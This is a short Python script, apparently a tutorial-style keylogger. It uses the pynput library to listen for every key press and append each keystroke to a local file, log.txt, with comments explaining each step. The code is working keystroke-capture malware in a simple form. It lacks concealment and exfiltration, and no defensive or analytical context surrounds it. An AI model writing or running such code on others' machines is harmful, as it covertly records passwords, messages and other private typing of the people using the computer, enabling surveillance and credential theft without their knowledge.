from pynput.keyboard import Listener

# function to write the file
def writefile(key):
    # the on_press function returns a key type parameter; it needs to be converted to a string type
    keydata = str(key)

    # Capture the keyboard, writing in log.txt
    with open("log.txt", 'a') as file:
        file.write(keydata)


# using with to free the memory of a listener object
# the parameter on_press calls the writefile function after a key is pressed on the keyboard
with Listener(on_press=writefile) as listener:
    #keep the keylogger running
    listener.join()
